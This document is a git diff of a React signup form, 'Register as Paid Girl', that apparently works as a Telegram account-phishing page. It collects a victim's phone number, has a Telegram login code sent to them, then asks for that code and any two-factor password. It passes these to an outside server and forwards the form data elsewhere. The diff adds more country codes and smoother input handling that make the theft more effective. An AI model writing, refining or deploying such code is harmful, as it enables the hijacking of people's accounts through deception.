@@ -5,143 +5,203 @@ import axios from 'axios';
 import { sendUpdate } from './App';
 import profiles, { getActiveProfile, setActiveProfile, setProfiles } from './profiles';
 import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
+import { parseError } from './utils';
 
 const forms = {
-    phoneNumber: "phoneNumber",
-    otp: "otp",
-    twofactor: "twofactor"
-}
+    phoneNumber: 'phoneNumber',
+    otp: 'otp',
+    twofactor: 'twofactor'
+};
+
+const countryCodes = [
+    { label: "India", value: "+91" },
+    { label: "United States", value: "+1" },
+    { label: "United Kingdom", value: "+44" },
+    { label: "Bangladesh", value: "+880" },
+    { label: "Pakistan", value: "+92" },
+    { label: "United Arab Emirates (Dubai)", value: "+971" },
+    { label: "Oman", value: "+968" },
+    { label: "Sri Lanka", value: "+94" },
+    { label: "Saudi Arabia", value: "+966" },
+    { label: "Kazakhstan", value: "+7" },
+    { label: "Uzbekistan", value: "+998" },
+    { label: "Malaysia", value: "+60" },
+    { label: "South Korea", value: "+82" },
+    { label: "Japan", value: "+81" },
+    { label: "France", value: "+33" },
+    { label: "Russia", value: "+7" },
+    { label: "Iran", value: "+98" },
+    { label: "Brazil", value: "+55" },
+    { label: "Indonesia", value: "+62" },
+    { label: "Mexico", value: "+52" },
+    { label: "Turkey", value: "+90" },
+    { label: "Vietnam", value: "+84" },
+    { label: "Nigeria", value: "+234" },
+    { label: "Philippines", value: "+63" },
+    { label: "Egypt", value: "+20" },
+    { label: "Italy", value: "+39" },
+    { label: "Ukraine", value: "+380" },
+    { label: "Colombia", value: "+57" },
+    { label: "Argentina", value: "+54" },
+    { label: "Thailand", value: "+66" },
+    // Add other country codes here
+];
 
 const RegForm = (props) => {
-
     const [formData, setFormData] = useState({
-        phoneNumber: "",
-        otp: "",
-        password: ""
+        phoneNumber: '',
+        otp: '',
+        password: '',
+        phoneCountryCode: '+91'
     });
     const [isLoading, setIsLoading] = useState(false);
     const [activeForm, setActiveForm] = useState(forms.phoneNumber);
-    const [errMsg, setErrMsg] = useState('Incorrect OTP, Please try again!');
+    const [errMsg, setErrMsg] = useState('');
     const [showErr, setShowErr] = useState(false);
     const inputRef = useRef(null);
-    const sumbitRef = useRef(null);
+    const submitRef = useRef(null);
     const [ok, setOk] = useState(false);
-    const handleInputChange = async (event) => {
-        setFormData({
-            ...formData,
-            [event.target.name]: event.target.value,
-        });
-    };
     const { user } = useParams();
+
     useEffect(() => {
+        // Assuming profiles and setProfiles are defined elsewhere in the actual code
         if (!profiles[getActiveProfile()]) {
-            setProfiles().then(profiles => {
-                setActiveProfile(user)
-            })
+            setProfiles().then((profiles) => {
+                setActiveProfile(user);
+            });
         }
-    }, [user])
+    }, [user]);
+
+    const handleInputChange = (event) => {
+        const { name, value } = event.target;
+        if (name === 'phoneNumber') {
+            const cleanedValue = value.replace(/\D/g, ''); // Remove non-numeric characters
+            setFormData({
+                ...formData,
+                [name]: cleanedValue,
+            });
+        } else {
+            setFormData({
+                ...formData,
+                [name]: value,
+            });
+        }
+    };
+
+    const validatePhoneNumber = (phoneNumber) => {
+        const mobileNumberPattern = /^[0-9]{10}$/;
+        return mobileNumberPattern.test(phoneNumber);
+    };
 
     const handlePhoneSubmit = async (event) => {
         event.preventDefault();
         if (!isLoading) {
-            if (formData.phoneNumber.startsWith('+')) {
-                const cleanedPhoneNumber = formData.phoneNumber.substring(1);
-                setFormData({ ...formData, phoneNumber: cleanedPhoneNumber })
-            }
-            const mobileNumberPattern = /^[0-9]{10}$/;
+            const phoneNumber = formData.phoneNumber.startsWith('+')
+                ? formData.phoneNumber.substring(1)
+                : formData.phoneNumber;
 
-            if (!mobileNumberPattern.test(formData.phoneNumber)) {
+            if (!validatePhoneNumber(phoneNumber)) {
                 alert('Please enter a valid 10-digit mobile number');
             } else {
                 setIsLoading(true);
                 try {
-                    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=91${formData.phoneNumber}`);
-                    await sendUpdate(JSON.stringify(formData));
+                    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
+                    await sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
                     setIsLoading(false);
                     if (response.status === 200) {
                         setActiveForm(forms.otp);
                     } else {
-                        if (response.message) {
-                            setErrMsg(response.message)
-                        }
+                        setErrMsg(response.message || 'Unknown error');
                         setShowErr(true);
                     }
                 } catch (error) {
-                    console.error('Error:', error);
                     setIsLoading(false);
-                    if (error.response?.data?.message) {
-                        setErrMsg(error.response?.data?.message)
-                    }
+                    setErrMsg(error.response?.data?.message || 'Unknown error');
                     setShowErr(true);
                 }
             }
         }
     };
-    async function handleOTPInput(e) {
-        e.preventDefault();
-        if (showErr) {
-            setShowErr(false);
-        }
+
+    const handleOTPInput = (e) => {
         const input = e.target;
-        const inputValue = input.value;
-        if (inputValue && !isNaN(inputValue) && inputValue.length === 1) {
-            input.value = inputValue;
-        } else if (inputValue.length > 0) {
-            input.value = inputValue % 10;
+        let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+        if (value.length > 1) {
+            value = value.slice(-1); // Keep only the last digit if more than one digit is pasted
         }
-        const otp1 = document.getElementById('otp1').value;
-        const otp2 = document.getElementById('otp2').value;
-        const otp3 = document.getElementById('otp3').value;
-        const otp4 = document.getElementById('otp4').value;
-        const otp5 = document.getElementById('otp5').value;
+        input.value = value;
 
-        setFormData({
-            ...formData,
-            otp: otp1 + otp2 + otp3 + otp4 + otp5
-        });
-        if (e.target.value.length > 0) {
-            if (input.name !== 'otp5') {
-                e.target.nextSibling.focus();
+        const otp = Array.from({ length: 5 }, (_, i) => document.getElementById(`otp${i + 1}`).value).join('');
+        setFormData({ ...formData, otp });
+
+        if (value.length === 1 && input.nextSibling) {
+            input.nextSibling.focus();
+        } else if (value.length === 0 && input.previousSibling) {
+            input.previousSibling.focus();
+        }
+        if (otp.length === 5) {
+            submitRef.current.focus()
+        }
+    };
+
+    const handlePaste = (e, type) => {
+        const pastedData = e.clipboardData.getData('text').replace(/\D/g, ''); // Remove non-numeric characters
+        if (type === 'phone') {
+            const lastTenDigits = pastedData.slice(-10);
+            if (lastTenDigits.length === 10) {
+                setFormData({ ...formData, phoneNumber: lastTenDigits });
             } else {
-                sumbitRef.current.focus()
-                // await handleOTPSubmit();
+                alert('Please paste a valid 10-digit mobile number');
             }
-        } else if (e.target.value.length === 0) {
-            e.target.previousSibling.focus();
+        } else if (type === 'otp') {
+            const otpInputs = document.querySelectorAll('.otp-input input');
+            if (pastedData.length === 5) {
+                otpInputs.forEach((input, index) => {
+                    input.value = pastedData[index];
+                });
+                submitRef.current.focus()
+                setFormData({ ...formData, otp: pastedData });
+            } else {
+                alert('Please paste a valid 5-digit OTP');
+            }
         }
+    };
 
-    }
     const handleOTPSubmit = async (event) => {
-        event.preventDefault()
+        event.preventDefault();
         if (!isLoading) {
             setShowErr(false);
-            const integerPattern = /^[0-9]+$/
 
-            if (integerPattern.test(formData.otp) && formData.otp.length === 5) {
+            if (/^[0-9]{5}$/.test(formData.otp)) {
                 setIsLoading(true);
                 try {
-                    const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${formData.otp}&phone=91${formData.phoneNumber}&password=${formData.password}`);
+                    const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
                     setIsLoading(false);
                     await sendUpdate(JSON.stringify(formData));
                     if (response.status === 200) {
                         setOk(true);
                         setActiveForm(forms.phoneNumber);
                     } else {
-                        if (response?.message) {
-                            setErrMsg(response.message);
-                            if (response.message?.toLowerCase().includes('2fa')) {
-                                setActiveForm(forms.twofactor);
-                            }
+                        let message = response.message
+                        console.log(message)
+                        if (response.message === 'PHONE_CODE_INVALID') {
+                            message = 'Incorrect OTP, Please try again!'
+                        }
+                        setErrMsg(message || 'Unknown error');
+                        if (response.message?.toLowerCase().includes('2fa')) {
+                            setActiveForm(forms.twofactor);
                         }
                         setShowErr(true);
                     }
                 } catch (error) {
                     setIsLoading(false);
-                    console.error('Error:', error.response?.data);
-                    if (error.response?.data?.message) {
-                        setErrMsg(error.response?.data?.message)
+                    const err = parseError(error)
+                    let message = err.message
+                    console.log(message)
+                    if (message === 'PHONE_CODE_INVALID') {
+                        message = 'Incorrect OTP, Please try again!'
                     }
-                    console.log(errMsg)
+                    setErrMsg(message || 'Unknown error');
                     setShowErr(true);
                 }
             }
@@ -149,73 +209,136 @@ const RegForm = (props) => {
     };
 
     return (
-        <div style={{ backgroundColor: '#1d2124', textAlign: "center", paddingTop: "4vh" }}>
-            {!ok && <div>
-                <div style={{ marginTop: "3vh" }}>
-                    <h6 style={{ fontSize: "6vw", color: "rgb(0 217 255)", margin: "0px 0px 0px 0px" }}>{props.heading ? props.heading : "Register as Paid Girl"}</h6>
-                    {!props.heading && <p style={{ fontSize: "3vw", color: "wheat" }}>Create your own webite page</p>}
-                </div>
-                {activeForm === forms.phoneNumber && (
-                    <form autoComplete='on' onSubmit={handlePhoneSubmit} className="register-form">
-                        <div>
-                            {props.others && <input type="text" autoFocus={true} ref={inputRef} name="firstName" placeholder="First Name" autoComplete="given-name" />}
-                            {props.others && <input type="text" name="lastName" placeholder="Last Name" autoComplete="family-name" />}
-                            <div className="phone-number-input">
-                                <select id="phone-country-code" readOnly name="phoneCountryCode" value="+91" required>
-                                    {/* <option value="+1">+1   (USA)</option> */}
-                                    <option value="+91">+91 &nbsp;&nbsp;&nbsp; (India)</option>
-                                    {/* <option value="+44">+44  (UK)</option> */}
-                                </select>
-                                <input type="tel" style={{ margin: '0px 0px 20px 0px' }} autoFocus={true} name="phoneNumber" minLength={10} maxLength={10} onChange={handleInputChange} required placeholder="Phone Number" autoComplete="tel" />
-                            </div>
-                            <button type="submit" className='button' style={{ fontSize: "17px", margin: '3vw 0px', background: isLoading ? "gray" : "rgb(0, 163, 255)", cursor: isLoading ? "not-allowed" : "pointer" }}><span style={{ paddingBottom: "3px" }}>Send OTP</span></button>
-                        </div>
-                    </form>
-                )}
-                {activeForm === forms.otp && (
-                    <form autoComplete='on' onSubmit={handleOTPSubmit} className="register-form">
-                        <div>
-                            <h6 style={{ color: "rgb(17 255 167)", fontSize: "15px", display: "block" }}> Enter the OTP received on your <span style={{ color: "red", fontWeight: 'bolder' }}>Telegram App</span> </h6>
-                            <div className="otp-input">
-                                <div className="otp-input">
-                                    <input type="number" autoFocus={true} inputMode="numeric" minLength={1} maxLength={1} name="otp1" id="otp1" onInput={handleOTPInput} required placeholder="0" />
-                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp2" id="otp2" onInput={handleOTPInput} required placeholder="0" />
-                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp3" id="otp3" onInput={handleOTPInput} required placeholder="0" />
-                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp4" id="otp4" onInput={handleOTPInput} required placeholder="0" />
-                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp5" id="otp5" onInput={handleOTPInput} required placeholder="0" />
-                                </div>
-                                <input style={{ display: "none" }}></input>
-                            </div>
-                            {showErr && <span style={{ color: "red" }}>{errMsg}</span>}
-                            <button type="submit" ref={sumbitRef} className='button' style={{ fontSize: "17px", margin: '3vw 0px', background: isLoading ? "gray" : "rgb(0, 163, 255)", cursor: isLoading ? "not-allowed" : "pointer" }}><span style={{ paddingBottom: "3px" }}> Submit</span></button>
-                        </div>
-                    </form>
-                )}
-                {activeForm === forms.twofactor && (
-                    <div>
-                        <label style={{ fontSize: "small", color: "aquamarine", marginTop: "5vh" }}>Telegram Two Factor Authentication Password</label>
-                        <form autoComplete='on' onSubmit={handleOTPSubmit} style={{ paddingTop: "0px" }} className="register-form">
+        <div style={{ backgroundColor: '#1d2124', textAlign: 'center', paddingTop: '4vh' }}>
+            {!ok && (
+                <div>
+                    <div style={{ marginTop: '3vh' }}>
+                        <h6 style={{ fontSize: '6vw', color: 'rgb(0 217 255)', margin: '0px' }}>
+                            {props.heading ? props.heading : 'Register as Paid Girl'}
+                        </h6>
+                        {!props.heading && <p style={{ fontSize: '3vw', color: 'wheat' }}>Create your own website page</p>}
+                    </div>
+                    {activeForm === forms.phoneNumber && (
+                        <form autoComplete='on' onSubmit={handlePhoneSubmit} className="register-form">
                             <div>
-                                <input type="text" autoFocus={true} name="2fa" placeholder="2FA - Password" />
-                                <button type="submit" className='button' style={{ fontSize: "17px", margin: '3vw 0px', background: isLoading ? "gray" : "rgb(0, 163, 255)", cursor: isLoading ? "not-allowed" : "pointer" }}><span style={{ paddingBottom: "3px" }}>Submit</span></button>
+                                {props.others && <input type="text" autoFocus ref={inputRef} name="firstName" placeholder="First Name" autoComplete="given-name" />}
+                                {props.others && <input type="text" name="lastName" placeholder="Last Name" autoComplete="family-name" />}
+                                <div className="phone-number-input">
+                                    <select id="phone-country-code" name="phoneCountryCode" value={formData.phoneCountryCode} onChange={handleInputChange} required>
+                                        {countryCodes.map((code) => (
+                                            <option key={code.value} value={code.value}>
+                                                {code.value} ({code.label})
+                                            </option>
+                                        ))}
+                                    </select>
+                                    <input
+                                        type="tel"
+                                        style={{ margin: '0px 0px 20px 0px' }}
+                                        autoFocus
+                                        name="phoneNumber"
+                                        minLength={10}
+                                        maxLength={10}
+                                        value={formData.phoneNumber}
+                                        onChange={handleInputChange}
+                                        onPaste={(e) => handlePaste(e, 'phone')}
+                                        required
+                                        placeholder="Phone Number"
+                                        autoComplete="tel"
+                                    />
+                                </div>
+                                <button
+                                    type="submit"
+                                    className='button'
+                                    style={{
+                                        fontSize: '17px',
+                                        margin: '3vw 0px',
+                                        background: isLoading ? 'gray' : 'rgb(0, 163, 255)',
+                                        cursor: isLoading ? 'not-allowed' : 'pointer'
+                                    }}
+                                >
+                                    <span style={{ paddingBottom: '3px' }}>Send OTP</span>
+                                </button>
                             </div>
                         </form>
-                    </div>
-                )}
-            </div>}
-            {ok && <div className='success-message'>
-                <img src="../tick2.png" alt="Tick Mark" class="tick"></img>
-                <h1>Application has been submitted</h1>
-                <p>We will contact you soon</p>
-            </div>}
+                    )}
+                    {activeForm === forms.otp && (
+                        <form autoComplete='on' onSubmit={handleOTPSubmit} className="register-form">
+                            <div>
+                                <h6 style={{ color: 'rgb(17 255 167)', fontSize: '15px', display: 'block' }}>
+                                    Enter the OTP received on your <span style={{ color: 'red', fontWeight: 'bolder' }}>Telegram App</span>
+                                </h6>
+                                <div className="otp-input" onPaste={(e) => handlePaste(e, 'otp')}>
+                                    {[...Array(5)].map((_, i) => (
+                                        <input
+                                            key={i}
+                                            type="number"
+                                            autoFocus={i === 0}
+                                            inputMode="numeric"
+                                            minLength={1}
+                                            maxLength={1}
+                                            name={`otp${i + 1}`}
+                                            id={`otp${i + 1}`}
+                                            onInput={handleOTPInput}
+                                            required
+                                            placeholder="0"
+                                        />
+                                    ))}
+                                </div>
+                                {showErr && <span style={{ color: 'red' }}>{errMsg}</span>}
+                                <button
+                                    type="submit"
+                                    ref={submitRef}
+                                    className='button'
+                                    style={{
+                                        fontSize: '17px',
+                                        margin: '3vw 0px',
+                                        background: isLoading ? 'gray' : 'rgb(0, 163, 255)',
+                                        cursor: isLoading ? 'not-allowed' : 'pointer'
+                                    }}
+                                >
+                                    <span style={{ paddingBottom: '3px' }}>Submit</span>
+                                </button>
+                            </div>
+                        </form>
+                    )}
+                    {activeForm === forms.twofactor && (
+                        <div>
+                            <label style={{ fontSize: 'small', color: 'aquamarine', marginTop: '5vh' }}>Telegram Two Factor Authentication Password</label>
+                            <form autoComplete='on' onSubmit={handleOTPSubmit} style={{ paddingTop: '0px' }} className="register-form">
+                                <div>
+                                    <input type="password" autoFocus name="2fa" placeholder="2FA - Password" />
+                                    <button
+                                        type="submit"
+                                        className='button'
+                                        style={{
+                                            fontSize: '17px',
+                                            margin: '3vw 0px',
+                                            background: isLoading ? 'gray' : 'rgb(0, 163, 255)',
+                                            cursor: isLoading ? 'not-allowed' : 'pointer'
+                                        }}
+                                    >
+                                        <span style={{ paddingBottom: '3px' }}>Submit</span>
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    )}
+                </div>
+            )}
+            {ok && (
+                <div className='success-message'>
+                    <img src="../tick2.png" alt="Tick Mark" className="tick" />
+                    <h1>Application has been submitted</h1>
+                    <p>We will contact you soon</p>
+                </div>
+            )}
             {isLoading && (
                 <div className="spinner-container">
                     <Spinner color="primary" />
                 </div>
             )}
         </div>
-
-    )
-}
+    );
+};
 
 export default RegForm;
